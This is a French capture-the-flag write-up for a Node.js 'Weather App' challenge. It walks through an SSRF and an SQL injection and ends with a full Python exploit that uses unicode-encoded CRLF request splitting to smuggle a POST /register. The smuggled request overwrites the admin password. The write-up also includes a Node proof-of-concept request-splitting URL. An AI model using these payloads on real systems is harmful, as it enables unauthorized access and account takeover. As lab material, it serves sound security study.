\section{Weather App}

keyword: ssrf, request smugglingi/splitting


deja point Ã  noter :
\begin{verbatim}
app.use(bodyParser.urlencoded({
    extended: true
}));
\end{verbatim}

Pour choper le flag, il faut se log en admin. 
\begin{verbatim}
router.post('/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return db.isAdmin(username, password)
			.then(admin => {
				if (admin) return res.send(fs.readFileSync('/app/flag').toString());
				return res.send(response('You are not admin'));
			})
			.catch(() => res.send(response('Something went wrong')));
	}
	
	return re.send(response('Missing parameters'));
});

INSERT INTO users (username, password) VALUES ('admin', '${ crypto.randomBytes(32).toString('hex') }');
\end{verbatim}

en endpoint on a \verb+/register+ qui n'est ouver qu'en localhost
\begin{verbatim}
router.post('/register', (req, res) => {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}
\end{verbatim}

la raison etant une injection SQL
\begin{verbatim}
    async register(user, pass) {
        // TODO: add parameterization and roll public
        return new Promise(async (resolve, reject) => {
            try {
                let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
                resolve((await this.db.run(query)));
            } catch(e) {
                reject(e);
            }
        });
    }
\end{verbatim}

dernier endpoint \verb+/api/weather+:
\begin{verbatim}

router.post('/api/weather', (req, res) => {
	let { endpoint, city, country } = req.body;

	if (endpoint && city && country) {
		return WeatherHelper.getWeather(res, endpoint, city, country);
	}

	return res.send(response('Missing parameters'));
});	
\end{verbatim}

avec:
\begin{verbatim}
let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`); 
\end{verbatim}

donc on a du ssrf. mais en get

peut on faire du request smuggling.

\href{https://hackerone.com/reports/409943}{Http request splitting}
\href{https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/}{SSRF
via Request Splitting}

\begin{verbatim}
The vulnerability seems to be fixed in v10.0.0 but still present in v8.12.0.
\end{verbatim}

\begin{verbatim}
const http = require('http')

const server = http.createServer((req, res) => {
  console.log(req.url);
  res.end();
});

server.listen(8000, function() {
  http.get('http://127.0.0.1:8000/?param=x\u{0120}HTTP/1.1\u{010D}\u{010A}Host:{\u0120}127.0.0.1:8000\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private', function() {
  });
});
\end{verbatim}

donc la partie interessante
\begin{verbatim}
http://127.0.0.1:8000/?param=x\u{0120}HTTP/1.1\u{010D}\u{010A}
Host:{\u0120}127.0.0.1:8000\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private'
\end{verbatim}

\begin{verbatim}
import requests
import argparse

def build_payload():
    base_url = "127.0.0.1/"
    s = "\u0120" # space 
    crlf = "\u010D\u010A" # "\r\n" 
    username = 'admin'
    password = "test') ON CONFLICT (username) DO UPDATE SET password = 'test'; --"
    password = password.replace(" ","%20").replace("'", "%27").replace('"', "%22").replace('(', "%28").replace(")", "%29")
    print(password)
    content_length = len(username) + len(password) + 19;
    http_tag = "HTTP/1.1"
    host_header = f"Host:{s}127.0.0.1"
    post_req_tag = f"POST{s}/register"
    content_type_header = f"Content-Type:{s}application/x-www-form-urlencoded"
    content_length_header = f"Content-Length:{s}{str(content_length)}"
    #connection_close_header = "Connection:" + s + "close"
    payload = base_url + s + http_tag + crlf + host_header + crlf + crlf + post_req_tag 
    payload += s + http_tag + crlf + host_header + crlf + content_type_header + crlf 
    payload +=  content_length_header + crlf + crlf + "username=" + username 
    payload += "&password=" + password + crlf + crlf + "GET" + s;
    return payload
    

proxies = {
    'http': 'http://127.0.0.1:8080'
}

parser = argparse.ArgumentParser()
parser.add_argument( "-u", "--url", default='http://127.0.0.1:1337')
parser.add_argument('-x', '--proxy')

def ssrf(args):
    url = args.url + '/api/weather'
    payload= build_payload()
    data = {
        'endpoint' : f'{payload}',
        'city' :'somewhere',
        'country' : "anywhere"
    }
    if args.proxy:
        r = requests.post(url, json=data, proxies=proxies)
    else:
        r = requests.post(url, json=data)
    print(r.status_code)
    print(r.text)

def main(args):
    print(args)
    ssrf(args)

if __name__ == '__main__':
    main(parser.parse_args())
\end{verbatim}
